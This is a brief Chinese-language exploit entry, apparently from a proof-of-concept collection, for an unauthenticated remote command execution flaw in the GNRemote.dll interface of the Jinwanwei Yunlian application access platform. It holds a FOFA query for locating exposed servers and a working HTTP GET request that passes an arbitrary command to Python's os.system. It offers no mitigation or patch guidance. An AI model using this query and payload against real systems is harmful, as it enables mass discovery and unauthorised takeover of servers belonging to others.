# 金万维-云联应用系统接入平台GNRemote.dll前台存在RCE漏洞

金万维-云联应用系统接入平台 GNRemote.dll接口存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```yaml
title="云联应用系统接入平台"
```

## poc

```yaml
GET /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=执行的命令 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![1fd71786e431416b8cdfa2cbac8e92b4.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407262118418.png)